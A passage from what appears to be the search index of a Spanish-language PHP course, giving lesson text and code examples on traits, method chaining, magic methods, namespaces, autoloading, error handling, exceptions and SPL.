//\u00a0Implementaciones\u00a0de\u00a0los\u00a0m\u00e9todos\n    // Obligatoriamente deber\u00e1 implementar public\u00a0function\u00a0mostrarResumen, mostrarTodo y generarFactura\n}\n</code></pre>"},{"location":"03phpoo.html#310-traits","title":"3.10 Traits","text":"<p>Los traits son un mecanismo de reutilizaci\u00f3n de c\u00f3digo en un lenguaje de herencia simple como PHP. </p> <p>Un trait es similar a una clase, pero solo sirve para agrupar funcionalidades que puede utilizar la clase que la use. No es posible instanciar un Trait en s\u00ed mismo.</p> <p>Una clase puede usar m\u00e1s de un trait. Se indica en su cuerpo mediante <code>use Trait1, Trait2, Trait3;</code>.</p> <p>Ejemplo:</p> <pre><code>&lt;?php\n   trait Logger {\n        public string $logLevel = \"INFO\";\n\n        public function log($message) {\n            echo $this-&gt;logLevel .\" Logging: \" . $message . \"\\n\";\n        }\n    }\n\n    class User {\n        use Logger; // Se incorpora el trait\n    }\n\n    class Product {\n        use Logger; // Se incorpora el mismo trait\n    }\n\n    $user = new User();\n    $user-&gt;log(\"User created\"); // El m\u00e9todo del trait ahora est\u00e1 disponible en la clase\n\n    $product = new Product();\n    $product-&gt;logLevel = \"ALERT\";\n    $product-&gt;log(\"Product updated\"); // Y tambi\u00e9n en esta clase\n</code></pre> <p>En la clase puedes usar las propiedades del trait como si fueran propias: leer, modificar y acceder de forma similar a como lo hace con la herencia:</p> <ul> <li>public: accesible desde cualquier sitio.</li> <li>protected: accesible desde dentro de la clase que usa el trait.</li> <li>private: s\u00f3lo accesible desde dentro del trait.</li> </ul> <p>El uso de trait est\u00e1 aconsejado para compartir m\u00e9todos m\u00e1s que propiedades. </p> <p>Comparaci\u00f3n con las interfaces</p> <p>El trait inyecta m\u00e9todos ya implementados y propiedades en la clase que lo use. A diferencia de la interfaz, que obliga a definir los m\u00e9todos en la clase que la implemente.</p>"},{"location":"03phpoo.html#311-metodos-encadenados","title":"3.11 M\u00e9todos encadenados","text":"<p>Sigue el planteamiento de la programaci\u00f3n funcional, y tambi\u00e9n se conoce como method chaining. Plantea que sobre un objeto se realizan varias llamadas.</p> <pre><code>&lt;?php\n$p1\u00a0=\u00a0new\u00a0Libro();\n$p1-&gt;setNombre(\"Harry\u00a0Potter\");\n$p1-&gt;setAutor(\"JK\u00a0Rowling\");\necho\u00a0$p1;\n\n// Method chaining\n$p2\u00a0=\u00a0new\u00a0Libro();\n$p2-&gt;setNombre(\"Patria\")-&gt;setAutor(\"Aramburu\");\necho\u00a0$p2;\n</code></pre> <p>Para facilitarlo, vamos a modificar todos sus m\u00e9todos mutadores (que modifican datos, setters, ...) para que devuelvan una referencia a <code>$this</code>:</p> <pre><code>&lt;?php\nclass\u00a0Libro\u00a0{\n    private\u00a0string\u00a0$nombre;\n    private\u00a0string\u00a0$autor;\n\n    public\u00a0function\u00a0getNombre()\u00a0:\u00a0string\u00a0{\n        return\u00a0$this-&gt;nombre;\n    }\n    public\u00a0function\u00a0setNombre(string\u00a0$nombre)\u00a0:\u00a0Libro\u00a0{\u00a0\n        $this-&gt;nombre\u00a0=\u00a0$nombre;\n        return\u00a0$this;\n    }\n\n    public\u00a0function\u00a0getAutor()\u00a0:\u00a0string\u00a0{\n        return\u00a0$this-&gt;autor;\n    }\n    public\u00a0function\u00a0setAutor(string\u00a0$autor)\u00a0:\u00a0Libro\u00a0{\n        $this-&gt;autor\u00a0=\u00a0$autor;\n        return\u00a0$this;\n    }\n\n    public\u00a0function\u00a0__toString()\u00a0:\u00a0string\u00a0{\n        return\u00a0$this-&gt;nombre.\"\u00a0de\u00a0\".$this-&gt;autor;\n    }\n}\n</code></pre>"},{"location":"03phpoo.html#312-metodos-magicos","title":"3.12 M\u00e9todos m\u00e1gicos","text":"<p>Todas las clases PHP ofrecen un conjunto de m\u00e9todos, tambi\u00e9n conocidos como magic methods que se pueden sobreescribir para sustituir su comportamiento. Algunos de ellos ya los hemos utilizado.</p> <p>Ante cualquier duda, es conveniente consultar la documentaci\u00f3n oficial.</p> <p>Los m\u00e1s destacables son:</p> <ul> <li><code>__construct()</code> \u2192 Se llama autom\u00e1ticamente la crear una instancia de la clase con <code>new</code>.</li> <li><code>__destruct()</code> \u2192 Se invoca al perder la referencia. Se utiliza para cerrar una conexi\u00f3n a la BD, cerrar un fichero, ...</li> <li><code>__toString()</code> \u2192 Representaci\u00f3n del objeto como cadena. Es decir, cuando hacemos <code>echo $objeto</code> se ejecuta autom\u00e1ticamente este m\u00e9todo.</li> <li><code>__get(propiedad)</code>, <code>__set(propiedad, valor)</code> \u2192 Se ejecuta su c\u00f3digo al acceder/modificar propiedades inaccesibles (protegidas o privadas) o inexistentes. Es m\u00e1s legible/mantenible codificar los getter/setter.</li> <li><code>__isset(propiedad)</code>, <code>__unset(propiedad)</code> \u2192 Se invocan cuando se ejecuta <code>isset</code> o <code>unset</code> sobre propiedades inaccesibles o inexistentes.</li> <li><code>__call()</code>, <code>__callStatic()</code> \u2192 Se ejecutan al llamar a un m\u00e9todo inaccesible en el contexto de objeto o est\u00e1tico respectivamente.</li> <li><code>__sleep()</code>, <code>__wakeup()</code> \u2192 Se ejecutan antes de serializar un objeto (serialize) o se reconstruye (unserialize), y se utilizan para definir qu\u00e9 propiedades se serializan.</li> </ul>"},{"location":"03phpoo.html#313-espacio-de-nombres","title":"3.13 Espacio de nombres","text":"<p>Desde PHP 5.3 y tambi\u00e9n conocidos como namespaces, permiten organizar las clases/interfaces, funciones y/o constantes de forma similar a los paquetes en Java. Est\u00e1n basados en el concepto similar a la organizaci\u00f3n de archivos en directorios que hacen los sistemas operativos: S\u00f3lo puede haber un archivo con el mismo nombre en un directorio y el acceso es ordenado estableciendo la ruta, evitando as\u00ed conflictos de nombres.</p>"},{"location":"03phpoo.html#justificacion","title":"Justificaci\u00f3n","text":"<p>Hoy en d\u00eda con la cantidad de librer\u00edas de terceros que se importan en los proyectos, no es nada raro que en nuestro c\u00f3digo necesitemos utilizar 2 clases que se llaman igual. Para ilustrar este concepto, sup\u00f3n que tenemos el siguiente c\u00f3digo:  </p> <pre><code>&lt;?php\n// index.php\ninclude_once \"app/modelo/compras/Producto.php\";\ninclude_once \"app/modelo/ventas/Producto.php\";\n\n// No funciona, hay solapamiento de recursos\n$producto = new Producto(\"Teclado Logitech MX Keys\", 56.99);\n$producto-&gt;compra();\n</code></pre> <p>Como habr\u00e1s comprobado, el int\u00e9rprete de PHP no sabe qu\u00e9 clase <code>Producto</code> utilizar y no funciona. </p> <p>\u00bfC\u00f3mo se resuelve esta ambig\u00fcedad? Lo has adivinado, usando espacios de nombres. </p>"},{"location":"03phpoo.html#declaracion","title":"Declaraci\u00f3n","text":"<p>Se declaran en la primera l\u00ednea mediante la palabra clave <code>namespace</code> seguida del nombre del espacio de nombres asignado (cada subnivel se separa con la barra invertida <code>\\</code>):</p> app/modelo/compras/Producto.phpapp/modelo/ventas/Producto.php <pre><code>&lt;?php\n// Declaraci\u00f3n de su namespace al principio del archivo, antes de cualquier salida.\nnamespace App\\Modelo\\Compras;\n\n// Definici\u00f3n de constante y funci\u00f3n fuera de la clase para\n// usos did\u00e1cticos de los namespaces\nconst IVA = 0.1;\n\nfunction precioConIva(Producto $producto) : float {\n    return $producto-&gt;getPrecio() * (1 + IVA);\n}\n\nclass Producto\n{\n    private string $nombre;\n    private float $precio;\n\n    public function __construct(string $nombre, float $precio)\n    {\n        $this-&gt;nombre = $nombre;\n        $this-&gt;precio = $precio;\n    }\n\n    public function getPrecio(): float\n    {\n        return $this-&gt;precio;\n    }\n\n    public function compra() : void {\n        echo \"&lt;p&gt;Compra del producto $this-&gt;nombre&lt;/p&gt;\";\n    }\n}\n</code></pre> <pre><code>&lt;?php\n// Declaraci\u00f3n de su namespace al principio del archivo, antes de cualquier salida.\nnamespace App\\Modelo\\Ventas;\n\n// Definici\u00f3n de constante y funci\u00f3n fuera de la clase para\n// usos did\u00e1cticos de los namespaces\nconst IVA = 0.21;\n\nfunction precioConIva(Producto $producto) : float {\n    return $producto-&gt;getPrecio() * (1 + IVA);\n}\n\nclass Producto\n{\n    private string $nombre;\n    private float $precio;\n\n    public function __construct(string $nombre, float $precio)\n    {\n        $this-&gt;nombre = $nombre;\n        $this-&gt;precio = $precio;\n    }\n\n    public function getPrecio(): float\n    {\n        return $this-&gt;precio;\n    }\n}\n</code></pre> <p>Recomendaci\u00f3n</p> <p>Un s\u00f3lo namespace por archivo y crear una estructura de carpetas respectando los niveles/subniveles (igual que se hace en Java).</p>"},{"location":"03phpoo.html#acceso","title":"Acceso","text":"<p>Para referenciar a un recurso que contiene un namespace, primero hemos de tenerlo disponible haciendo uso de <code>include</code> o <code>require</code>, igual que hasta ahora. </p> <pre><code>&lt;?php\n// index.php en la ra\u00edz del proyecto, al nivel de app\ninclude_once \"app/modelo/compras/Producto.php\";\ninclude_once \"app/modelo/ventas/Producto.php\";\n\n$producto1 = new \\App\\Modelo\\Compras\\Producto(\"Teclado Logitech MX Keys\", 84.99);\n$producto1-&gt;compra();\n\n$producto2 = new \\App\\Modelo\\Ventas\\Producto(\"Rat\u00f3n Logitech MX Master 3S\", 56.99);\n$producto2-&gt;venta();\n</code></pre> <p>Existen tres tipos de acceso:</p> <ul> <li>totalmente cualificado: <code>\\rutaAbsoluta\\recurso</code></li> <li>cualificado: <code>rutaRelativa\\recurso</code> \u2192 no hace falta poner el namespace completo</li> <li>sin cualificar: <code>recurso</code></li> </ul> <pre><code>&lt;?php\n// listado.php en app/modelo/\nnamespace App\\Modelo;\n\ninclude_once \"ventas/Producto.php\";\n\n$producto2 = new Ventas\\Producto(\"Rat\u00f3n Logitech MX Master 3S\", 56.99);\n$producto2-&gt;venta();\n\n// Totalmente cualificado --&gt; absoluta desde ra\u00edz\n// Cualificado --&gt; relativo al namespace actual\n// No cualificado --&gt; relativo al namespace actual\n\necho \\App\\Modelo\\Ventas\\IVA;\necho Ventas\\IVA;\necho IVA; // No funciona: no existe IVA en el namespace actual\n\necho \\App\\Modelo\\Ventas\\precioConIva($producto2);\necho Ventas\\precioConIva($producto2);\necho precioConIva($producto2); // No funciona: no existe precioConIva en el namespace actual\n\n$p1 = new \\App\\Modelo\\Ventas\\Producto(\"Producto...\", 11.99);\n$p2 = new Ventas\\Producto(\"Producto...\", 11.99);\n$p3 = new Producto(\"Producto...\", 11.99); // No funciona: no existe Producto en el namespace actual\n</code></pre> <p>Para evitar la referencia cualificada podemos declarar el uso mediante <code>use</code> (similar a hacer <code>import</code> en Java). Se hace en la cabecera, tras el <code>namespace</code>:</p> <p>Los tipos posibles son:</p> <ul> <li><code>use const nombreCualificadoConstante</code></li> <li><code>use function nombreCualificadoFuncion</code></li> <li><code>use nombreCualificadoClase</code></li> <li><code>use nombreCualificadoClase as NuevoNombre</code> // para renombrar elementos</li> </ul> <p>Por ejemplo, si queremos utilizar la clase <code>\\App\\Modelo\\Ventas\\Producto</code> desde un recurso que se encuentra en la ra\u00edz, por ejemplo en <code>index.php</code>, har\u00edamos:</p> <pre><code>&lt;?php\ninclude_once \"app/modelo/compras/Producto.php\";\ninclude_once \"app/modelo/ventas/Producto.php\";\n\nuse const \\App\\Modelo\\Ventas\\IVA;\nuse function \\App\\Modelo\\Ventas\\precioConIva;\nuse \\App\\Modelo\\Ventas\\Producto as ProductoVenta; // Hay que renombrar la clase Producto\nuse \\App\\Modelo\\Compras\\Producto as ProductoCompra; // Hay que renombrar la clase Producto\n\n$producto1 = new ProductoCompra(\"Teclado Logitech MX Keys\", 84.99);\n$producto1-&gt;compra();\n\n$producto2 = new ProductoVenta(\"Rat\u00f3n Logitech MX Master 3S\", 56.99);\n$producto2-&gt;venta();\n\necho IVA;\necho precioConIva($producto2);\n</code></pre> <p>To <code>use</code> or not to <code>use</code></p> <p>En resumen, <code>use</code> permite acceder sin cualificar a recursos que est\u00e1n en otro namespace. Si estamos en el mismo espacio de nombre, no necesitamos <code>use</code>.</p>"},{"location":"03phpoo.html#organizacion","title":"Organizaci\u00f3n","text":"<p>Todo proyecto, conforme crece, necesita organizar su c\u00f3digo fuente. Se plantea una organizaci\u00f3n en la que los archivos que interactuan con el navegador se colocan en la ra\u00edz, y las clases que definamos van dentro de un namespace (y dentro de su propia carpeta <code>src</code> o <code>app</code>).</p> <p>Organizaci\u00f3n, includes y usos</p> <ul> <li>Colocaremos cada recurso en un fichero aparte.</li> <li>En la primera l\u00ednea indicaremos su namespace (si no est\u00e1 en el ra\u00edz).</li> <li>Si utilizamos otros recursos, haremos un <code>include_once</code> de esos recursos (clases, interfaces, etc...). Cada recurso debe incluir todos los otros recursos que referencie: la clase de la que hereda, interfaces que implementa, clases utilizadas/recibidas como par\u00e1metros, etc...</li> <li>Si los recursos est\u00e1n en un espacio de nombres diferente al que estamos, emplearemos <code>use</code> con la ruta completa para luego utilizar referencias sin cualificar.</li> </ul>"},{"location":"03phpoo.html#autoload","title":"Autoload","text":"<p>\u00bfNo es tedioso tener que hacer el <code>include</code> de los archivos con los recursos? El autoload viene al rescate.</p> <p>As\u00ed pues, permite cargar las clases (no las constantes ni las funciones) que se van a utilizar y evitar tener que hacer el <code>include_once</code> de cada una de ellas. Para ello, se utiliza la funci\u00f3n <code>spl_autoload_register</code></p> <pre><code>&lt;?php\nspl_autoload_register(\u00a0function(\u00a0$nombreClase\u00a0)\u00a0{\n    include_once\u00a0$nombreClase.'.php';\n}\u00a0);\n?&gt;\n</code></pre> <p>\u00bfPor qu\u00e9 se llaman autoload?</p> <p>Porque antes se realizaba mediante el m\u00e9todo m\u00e1gico <code>__autoload()</code>, el cual est\u00e1 obsoleto desde PHP 7.2</p> Organizaci\u00f3n con autoload <p>Y \u00bfc\u00f3mo organizamos ahora nuestro c\u00f3digo aprovechando el autoload?</p> <p>Para facilitar la b\u00fasqueda de los recursos a incluir, es recomendable colocar todas las clases dentro de una misma carpeta y seguir el est\u00e1ndar PSR-4. Nosotros la vamos a colocar dentro de <code>app</code> (m\u00e1s adelante, cuando estudiemos Laravel veremos el motivo de esta decisi\u00f3n). Otras carpetas que podemos crear son <code>test</code> para colocar las pruebas PhpUnit que luego realizaremos, o la carpeta <code>vendor</code> donde se almacenar\u00e1n las librer\u00edas del proyecto (esta carpeta es un est\u00e1ndard dentro de PHP, ya que Composer la crea autom\u00e1ticamente).</p> <p>Como hemos colocado todos nuestros recursos dentro de <code>app</code>, ahora nuestro <code>autoload.php</code> (el cual colocamos en la carpeta ra\u00edz) s\u00f3lo va a buscar dentro de esa carpeta:</p> <pre><code>&lt;?php\nspl_autoload_register(\u00a0function(\u00a0$nombreClase\u00a0)\u00a0{\n    include_once\u00a0\"app/\".$nombreClase.'.php';\n}\u00a0);\n?&gt;\n</code></pre> <p>Autoload y rutas err\u00f3neas</p> <p>En sistemas UNIX (Docker incluido) al hacer el include de la clase que recibe como par\u00e1metro, las barras de los namespace (<code>\\</code>) son diferentes a las de las rutas (<code>/</code>). Por ello, es mejor que utilicemos el fichero autoload:</p> <pre><code>&lt;?php\nspl_autoload_register(\u00a0function(\u00a0$nombreClase\u00a0)\u00a0{\n    $ruta = \"app\\\\\".$nombreClase.'.php';\n    $ruta = str_replace(\"\\\\\", \"/\", $ruta); // Sustituimos las barras\n    include_once\u00a0$ruta;\n}\u00a0);\n?&gt;\n</code></pre> PHP-FIG y el Est\u00e1ndar PSR-4 <p>PHP-FIG es un grupo de programadores que tiene como objetivos promover el ecosistema de PHP y definir est\u00e1ndares basados en la investigaci\u00f3n, experimentaci\u00f3n y sobre todo en la experiencia del mundo real, para facilitar la colaboraci\u00f3n entre programadores y proyectos.</p> <p>La Recomendaci\u00f3n 4 de Est\u00e1ndares PHP PSR-4 es un est\u00e1ndar establecido por PHP-FIG  que proporciona una convenci\u00f3n com\u00fan para la carga autom\u00e1tica de clases PHP seg\u00fan espacios de nombres. La PSR-4 simplifica la organizaci\u00f3n de clases y archivos, facilitando la gesti\u00f3n de grandes bases de c\u00f3digo y la colaboraci\u00f3n en proyectos.</p>"},{"location":"03phpoo.html#314-gestion-de-errores","title":"3.14 Gesti\u00f3n de Errores","text":"<p>PHP clasifica los errores que ocurren en diferentes niveles. Cada nivel se identifica con una constante. Por ejemplo:</p> <ul> <li><code>E_ERROR</code>: errores fatales, no recuperables. Se interrumpe el script.</li> <li><code>E_WARNING</code>: advertencias en tiempo de ejecuci\u00f3n. El script no se interrumpe.</li> <li><code>E_NOTICE</code>: avisos en tiempo de ejecuci\u00f3n.  </li> </ul> <p>Pod\u00e9is comprobar el listado completo de constantes de https://www.php.net/manual/es/errorfunc.constants.php</p> <p>Para la configuraci\u00f3n de los errores podemos hacerlo de dos formas:</p> <ul> <li>A nivel de <code>php.ini</code>:<ul> <li><code>error_reporting</code>: indica los niveles de errores a notificar<ul> <li><code>error_reporting = E_ALL &amp; ~E_NOTICE</code> -&gt; Todos los errores menos los avisos en tiempo de ejecuci\u00f3n.</li> </ul> </li> <li><code>display_errors</code>: indica si mostrar o no los errores por pantalla. En entornos de producci\u00f3n hay que ponerlo a <code>off</code>.</li> </ul> </li> <li>Mediante c\u00f3digo con las siguientes funciones:<ul> <li><code>error_reporting(codigo)</code> -&gt; Controla qu\u00e9 errores notificar</li> <li><code>set_error_handler(nombreManejador)</code> -&gt; Indica qu\u00e9 funci\u00f3n se invocar\u00e1 cada vez que se encuentre un error. El manejador recibe como par\u00e1metros el nivel del error y el mensaje</li> </ul> </li> </ul> <p>A continuaci\u00f3n tenemos un ejemplo mediante c\u00f3digo:</p> Funciones para la gesti\u00f3n de erroresConsola <pre><code>&lt;?php\nerror_reporting(E_ALL\u00a0&amp;\u00a0~E_NOTICE\u00a0&amp;\u00a0~E_WARNING);\n$resultado\u00a0=\u00a0$dividendo\u00a0/\u00a0$divisor;\n\nerror_reporting(E_ALL\u00a0&amp;\u00a0~E_NOTICE);\nset_error_handler(\"miManejadorErrores\");\n$resultado\u00a0=\u00a0$dividendo\u00a0/\u00a0$divisor;\nrestore_error_handler();\u00a0//\u00a0vuelve\u00a0al\u00a0anterior\n\nfunction\u00a0miManejadorErrores($nivel,\u00a0$mensaje)\u00a0{\n    switch($nivel)\u00a0{\n        case\u00a0E_WARNING:\n            echo\u00a0\"&lt;strong&gt;Warning&lt;/strong&gt;:\u00a0$mensaje.&lt;br/&gt;\";\n            break;\n        default:\n            echo\u00a0\"Error\u00a0de\u00a0tipo\u00a0no\u00a0especificado:\u00a0$mensaje.&lt;br/&gt;\";\n    }\n}\n</code></pre> <pre><code>Error de tipo no especificado: Undefined variable: dividendo.\nError de tipo no especificado: Undefined variable: divisor.\nError de tipo Warning: Division by zero.\n</code></pre>"},{"location":"03phpoo.html#315-excepciones","title":"3.15 Excepciones","text":"<p>La gesti\u00f3n de excepciones forma parte desde PHP 5. Su funcionamiento es similar a Java, haciendo uso de un bloque <code>try / catch / finally</code>. Si detectamos una situaci\u00f3n an\u00f3mala y queremos lanzar una excepci\u00f3n, deberemos realizar <code>throw new Exception</code> (adjuntando el mensaje que lo ha provocado).</p> <pre><code>&lt;?php\ntry\u00a0{\n    if\u00a0($divisor\u00a0==\u00a00) {\n        throw\u00a0new\u00a0Exception(\"Divisi\u00f3n\u00a0por\u00a0cero.\");\n    }\n    $resultado\u00a0=\u00a0$dividendo\u00a0/\u00a0$divisor;\n}\u00a0catch\u00a0(Exception\u00a0$e)\u00a0{\n    echo\u00a0\"Se\u00a0ha\u00a0producido\u00a0el\u00a0siguiente\u00a0error:\u00a0\".$e-&gt;getMessage();\n}\n</code></pre> <p>La clase <code>Exception</code> es la clase padre de todas las excepciones. Su constructor recibe <code>mensaje[codigoError][excepcionPrevia]</code>.</p> <p>A partir de un objeto <code>Exception</code>, podemos acceder a los m\u00e9todos <code>getMessage()</code>y <code>getCode()</code> para obtener el mensaje y el c\u00f3digo de error de la excepci\u00f3n capturada.</p> <p>El propio lenguaje ofrece un conjunto de excepciones ya definidas, las cuales podemos capturar (y lanzar desde PHP 7). Se recomienda su consulta en la documentaci\u00f3n oficial.</p>"},{"location":"03phpoo.html#crear-excepciones","title":"Crear excepciones","text":"<p>Para crear una excepci\u00f3n, la forma m\u00e1s corta es crear una clase que \u00fanicamente herede de <code>Exception</code>.</p> <pre><code>&lt;?php\nclass\u00a0HolaExcepcion\u00a0extends\u00a0Exception\u00a0{}\n</code></pre> <p>Si queremos, y es recomendable dependiendo de los requisitos, podemos sobrecargar los m\u00e9todos m\u00e1gicos, por ejemplo, sobrecargando el constructor y llamando al constructor del padre, o rescribir el m\u00e9todo <code>__toString</code> para cambiar su mensaje:</p> <pre><code>&lt;?php\nclass\u00a0MiExcepcion\u00a0extends\u00a0Exception\u00a0{\n\u00a0\u00a0\u00a0\u00a0public\u00a0function\u00a0__construct($msj,\u00a0$codigo\u00a0=\u00a00,\u00a0Exception\u00a0$previa\u00a0=\u00a0null)\u00a0{\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0//\u00a0c\u00f3digo\u00a0propio\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0parent::__construct($msj,\u00a0$codigo,\u00a0$previa);\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0public\u00a0function\u00a0__toString()\u00a0{\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return\u00a0__CLASS__\u00a0.\u00a0\":\u00a0[{$this-&gt;code}]:\u00a0{$this-&gt;message}\\n\";\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0public\u00a0function\u00a0miFuncion()\u00a0{\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0echo\u00a0\"Una\u00a0funci\u00f3n\u00a0personalizada\u00a0para\u00a0este\u00a0tipo\u00a0de\u00a0excepci\u00f3n\\n\";\n\u00a0\u00a0\u00a0\u00a0}\n}\n</code></pre> <p>Si definimos una excepci\u00f3n de aplicaci\u00f3n dentro de un namespace, cuando referenciemos a <code>Exception</code>, deberemos referenciarla mediante su nombre totalmente cualificado (<code>\\Exception</code>), o utilizando <code>use</code>:</p> Mediante nombre totalmente cualificadoMediante <code>use</code> <pre><code>&lt;?php\nnamespace \\Dwes\\Ejemplos;\n\nclass\u00a0AppExcepcion\u00a0extends\u00a0\\Exception\u00a0{}\n</code></pre> <pre><code>&lt;?php\nnamespace \\Dwes\\Ejemplos;\n\nuse Exception; // Sin \"use\" buscar\u00eda Exception en el namespace actual\n\nclass\u00a0AppExcepcion\u00a0extends\u00a0Exception\u00a0{}\n</code></pre>"},{"location":"03phpoo.html#excepciones-multiples","title":"Excepciones m\u00faltiples","text":"<p>Se pueden usar excepciones m\u00faltiples para comprobar diferentes condiciones. A la hora de capturarlas, se hace de m\u00e1s espec\u00edfica a m\u00e1s general.</p> <pre><code>&lt;?php\n$email\u00a0=\u00a0\"ejemplo@ejemplo.com\";\ntry\u00a0{\n\u00a0\u00a0\u00a0\u00a0//\u00a0Comprueba\u00a0si\u00a0el\u00a0email\u00a0es\u00a0v\u00e1lido\n\u00a0\u00a0\u00a0\u00a0if(filter_var($email,\u00a0FILTER_VALIDATE_EMAIL)\u00a0===\u00a0FALSE)\u00a0{\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw\u00a0new\u00a0MiExcepcion($email);\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0//\u00a0Comprueba\u00a0la\u00a0palabra\u00a0ejemplo\u00a0en\u00a0la\u00a0direcci\u00f3n\u00a0email\n\u00a0\u00a0\u00a0\u00a0if(strpos($email,\u00a0\"ejemplo\")\u00a0!==\u00a0FALSE)\u00a0{\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw\u00a0new\u00a0Exception(\"$email\u00a0es\u00a0un\u00a0email\u00a0de\u00a0ejemplo no v\u00e1lido\");\n\u00a0\u00a0\u00a0\u00a0}\n}\u00a0catch\u00a0(MiExcepcion\u00a0$e)\u00a0{\n\u00a0\u00a0\u00a0\u00a0echo\u00a0$e-&gt;miFuncion();\n}\u00a0catch(Exception\u00a0$e)\u00a0{\n\u00a0\u00a0\u00a0\u00a0echo\u00a0$e-&gt;getMessage();\n}\n</code></pre> <p>Autoevaluaci\u00f3n</p> <p>\u00bfQu\u00e9 pasar\u00eda al ejectuar el siguiente c\u00f3digo? <pre><code>&lt;?php\nclass\u00a0MainException\u00a0extends\u00a0Exception\u00a0{}\nclass\u00a0SubException\u00a0extends\u00a0MainException\u00a0{}\n\ntry\u00a0{\n\u00a0\u00a0\u00a0\u00a0throw\u00a0new\u00a0SubException(\"Lanzada\u00a0SubException\");\n}\u00a0catch\u00a0(MainException\u00a0$e)\u00a0{\n\u00a0\u00a0\u00a0\u00a0echo\u00a0\"Capturada\u00a0MainException\u00a0\"\u00a0.\u00a0$e-&gt;getMessage();\n}\u00a0catch\u00a0(SubException\u00a0$e)\u00a0{\n\u00a0\u00a0\u00a0\u00a0echo\u00a0\"Capturada\u00a0SubException\u00a0\"\u00a0.\u00a0$e-&gt;getMessage();\n}\u00a0catch\u00a0(Exception\u00a0$e)\u00a0{\n\u00a0\u00a0\u00a0\u00a0echo\u00a0\"Capturada\u00a0Exception\u00a0\"\u00a0.\u00a0$e-&gt;getMessage();\n}\n</code></pre></p> <p>Si en el mismo <code>catch</code> queremos capturar varias excepciones, hemos de utilizar el operador <code>|</code>:</p> <pre><code>&lt;?php\nclass\u00a0MainException\u00a0extends\u00a0Exception\u00a0{}\nclass\u00a0SubException\u00a0extends\u00a0MainException\u00a0{}\n\ntry\u00a0{\n\u00a0\u00a0\u00a0\u00a0throw\u00a0new\u00a0SubException(\"Lanzada\u00a0SubException\");\n}\u00a0catch\u00a0(MainException\u00a0|\u00a0SubException\u00a0$e\u00a0)\u00a0{\n\u00a0\u00a0\u00a0\u00a0echo\u00a0\"Capturada\u00a0Exception\u00a0\"\u00a0.\u00a0$e-&gt;getMessage();\n}\n</code></pre> <p>Desde PHP 7, existe el tipo <code>Throwable</code>, el cual es un interfaz que implementan tanto los errores como las excepciones, y nos permite capturar los dos tipos a la vez:</p> <pre><code>&lt;?php\ntry\u00a0{\n\u00a0\u00a0\u00a0\u00a0//\u00a0tu\u00a0codigo\n}\u00a0catch\u00a0(Throwable\u00a0$e)\u00a0{\n\u00a0\u00a0\u00a0\u00a0echo\u00a0'Forma\u00a0de\u00a0capturar\u00a0errores\u00a0y\u00a0excepciones\u00a0a\u00a0la\u00a0vez';\n}\n</code></pre> <p>Si s\u00f3lo queremos capturar los errores fatales, podemos hacer uso de la clase <code>Error</code>:</p> <pre><code>&lt;?php\ntry\u00a0{\n\u00a0\u00a0\u00a0\u00a0//\u00a0Genera\u00a0una\u00a0notificaci\u00f3n\u00a0que\u00a0no\u00a0se\u00a0captura\n\u00a0\u00a0\u00a0\u00a0echo\u00a0$variableNoAsignada;\n\u00a0\u00a0\u00a0\u00a0//\u00a0Error\u00a0fatal\u00a0que\u00a0se\u00a0captura\n\u00a0\u00a0\u00a0\u00a0funcionQueNoExiste();\n}\u00a0catch\u00a0(Error\u00a0$e)\u00a0{\n\u00a0\u00a0\u00a0\u00a0echo\u00a0\"Error\u00a0capturado:\u00a0\"\u00a0.\u00a0$e-&gt;getMessage();\n}\n</code></pre>"},{"location":"03phpoo.html#relanzar-excepciones","title":"Relanzar excepciones","text":"<p>En las aplicaciones reales, es muy com\u00fan capturar una excepci\u00f3n de sistema y lanzar una de aplicaci\u00f3n que hemos definido nostros. Tambi\u00e9n podemos lanzar las excepciones sin necesidad de estar dentro de un <code>try/catch</code>.</p> <pre><code>&lt;?php\nclass\u00a0AppException\u00a0extends\u00a0Exception\u00a0{}\n\ntry\u00a0{\n\u00a0\u00a0\u00a0\u00a0//\u00a0C\u00f3digo\u00a0de\u00a0negocio\u00a0que\u00a0falla\n}\u00a0catch\u00a0(Exception\u00a0$e)\u00a0{\n\u00a0\u00a0\u00a0\u00a0throw\u00a0new\u00a0AppException(\"AppException:\u00a0\".$e-&gt;getMessage(), $e-&gt;getCode(),\u00a0$e);\n}\n</code></pre>"},{"location":"03phpoo.html#316-spl","title":"3.16 SPL","text":"<p>Standard PHP Library es el conjunto de funciones y utilidades que ofrece PHP, como:</p> <ul> <li>Estructuras de datos<ul> <li>Pila, cola, cola de prioridad, lista doblemente enlazada, etc... </li> </ul> </li> <li>Conjunto de iteradores dise\u00f1ados para recorrer estructuras agregadas<ul> <li>arrays, resultados de bases de datos, \u00e1rboles XML, listados de directorios, etc.</li> </ul> </li> </ul> <p>Pod\u00e9is consultar la documentaci\u00f3n en https://www.php.net/manual/es/book.spl.php o ver algunos ejemplos en https://diego.com.es/tutorial-de-la-libreria-spl-de-php</p> <p>Tambi\u00e9n define un conjunto de excepciones que podemos utilizar para que las lancen nuestras aplicaciones:</p> <ul> <li><code>LogicException</code> (<code>extends Exception</code>)<ul> <li><code>BadFunctionCallException</code></li> <li><code>BadMethodCallException</code></li> <li><code>DomainException</code></li> <li><code>InvalidArgumentException</code></li> <li><code>LengthException</code></li> <li><code>OutOfRangeException</code></li> </ul> </li> <li><code>RuntimeException</code> (<code>extends Exception</code>)<ul> <li><code>OutOfBoundsException</code></li> <li><code>OverflowException</code></li> <li><code>RangeException</code></li> <li><code>UnderflowException</code></li> <li><code>UnexpectedValueException</code></li> </ul> </li> </ul> <p>Tambi\u00e9n pod\u00e9is consultar la documentaci\u00f3n de estas excepciones en https://www.php.net/manual/es/spl.exceptions.php.</p>"},{"location":"03phpoo.html#317-referencias","title":"3.17 Referencias","text":"<ul> <li>Manual de PHP</li> <li>Manual de OO en PHP - www.desarrolloweb.com</li> </ul>"},{"location":"03phpoo.html#318-actividades","title":"3.18 Actividades","text":"<ol> 